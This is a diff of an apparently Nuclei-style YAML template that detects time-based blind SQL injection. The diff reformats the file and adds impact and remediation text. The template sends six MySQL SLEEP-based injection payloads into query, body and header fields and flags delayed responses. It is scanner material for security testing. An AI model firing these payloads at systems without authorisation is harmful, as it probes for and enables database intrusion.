@@ -1,63 +1,95 @@
 id: time-based-sqli
-
 info:
   name: Time-Based Blind SQL Injection
   author: 0xKayala
   severity: critical
-  description: |
-    This Template detects time-based Blind SQL Injection vulnerability
+  description: 'This Template detects time-based Blind SQL Injection vulnerability
+
+    '
   tags: time-based-sqli,sqli,dast,blind
+  impact: '- Ability to execute arbitrary SQL queries on the backend database, potentially
+    allowing an attacker to access, modify, or delete sensitive data.
 
+    - Potential for privilege escalation by manipulating database queries to gain
+    unauthorized access to restricted areas or functionality.
+
+    - Possibility of using the vulnerability to perform reconnaissance on the target
+    system, such as enumerating database schema, table structures, and column names.
+
+    - Risk of remote code execution if the application is susceptible to SQL injection
+    and the underlying database management system is vulnerable to exploits.
+
+    - Potential for data exfiltration, where an attacker can extract sensitive information
+    from the database, such as customer records, financial data, or intellectual property.'
+  remediation: 'To address the Time-Based Blind SQL Injection vulnerability, it is
+    crucial to implement a comprehensive solution that not only mitigates the immediate
+    risk but also prevents similar vulnerabilities from arising in the future. The
+    recommended approach involves a combination of secure coding practices, input
+    validation, and the use of prepared statements or parameterized queries.
+
+
+    Developers should:
+
+    - Implement robust input validation and sanitization techniques to ensure that
+    all user-supplied data is properly sanitized before being used in SQL queries.
+
+    - Use prepared statements or parameterized queries instead of directly concatenating
+    user input into SQL queries, as this effectively prevents SQL injection attacks.
+
+    - Review the application''s codebase and identify all locations where user input
+    is used in SQL queries, and ensure that appropriate validation and sanitization
+    measures are in place.
+
+    - Regularly review and update the application''s security practices, including
+    staying informed about the latest security vulnerabilities and best practices
+    in the industry.
+
+    - Implement a comprehensive security testing regimen, including regular penetration
+    testing and security audits, to identify and address any emerging vulnerabilities.'
 flow: http(1) && http(2)
-
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}"
+- method: GET
+  path:
+  - '{{BaseURL}}'
+  matchers:
+  - type: dsl
+    dsl:
+    - duration<=7
+    internal: true
+- raw:
+  - '@timeout: 20s
 
-    matchers:
-      - type: dsl
-        dsl:
-          - "duration<=7"
-        internal: true
+    GET / HTTP/1.1
 
-  - raw:
-      - |
-        @timeout: 20s
-        GET / HTTP/1.1
-        Host: {{Hostname}}
+    Host: {{Hostname}}
 
-    payloads:
-      injection:
-        - "(SELECT(0)FROM(SELECT(SLEEP(7)))a)"
-        - "'XOR(SELECT(0)FROM(SELECT(SLEEP(7)))a)XOR'Z"
-        - "' AND (SELECT 4800 FROM (SELECT(SLEEP(7)))HoBG)--"
-        - "if(now()=sysdate(),SLEEP(7),0)"
-        - "'XOR(if(now()=sysdate(),SLEEP(7),0))XOR'Z"
-        - "'XOR(SELECT CASE WHEN(1234=1234) THEN SLEEP(7) ELSE 0 END)XOR'Z"
-
-    fuzzing:
-      - part: query
-        type: replace
-        mode: single
-        fuzz:
-          - "{{injection}}"
-
-      - part: body
-        type: replace
-        mode: single
-        fuzz:
-          - "{{injection}}"
-
-      - part: header
-        type: replace
-        mode: single
-        fuzz:
-          - "{{injection}}"
-          
-    stop-at-first-match: true
-    matchers:
-      - type: dsl
-        dsl:
-          - "duration>=7 && duration <=16"
-# digest: 4a0a004730450220221817cdddedb8336ddb4afc4476f70da46a0dfb726a703a5e748458ae5bef000221009ebe3675d3fd10bf29161c179bd9b317b01f18643c2f8a6731ed9d89569495cc:922c64590222798bb761d5b6d8e72950
+    '
+  payloads:
+    injection:
+    - (SELECT(0)FROM(SELECT(SLEEP(7)))a)
+    - '''XOR(SELECT(0)FROM(SELECT(SLEEP(7)))a)XOR''Z'
+    - ''' AND (SELECT 4800 FROM (SELECT(SLEEP(7)))HoBG)--'
+    - if(now()=sysdate(),SLEEP(7),0)
+    - '''XOR(if(now()=sysdate(),SLEEP(7),0))XOR''Z'
+    - '''XOR(SELECT CASE WHEN(1234=1234) THEN SLEEP(7) ELSE 0 END)XOR''Z'
+  fuzzing:
+  - part: query
+    type: replace
+    mode: single
+    fuzz:
+    - '{{injection}}'
+  - part: body
+    type: replace
+    mode: single
+    fuzz:
+    - '{{injection}}'
+  - part: header
+    type: replace
+    mode: single
+    fuzz:
+    - '{{injection}}'
+  stop-at-first-match: true
+  matchers:
+  - type: dsl
+    dsl:
+    - duration>=7 && duration <=16
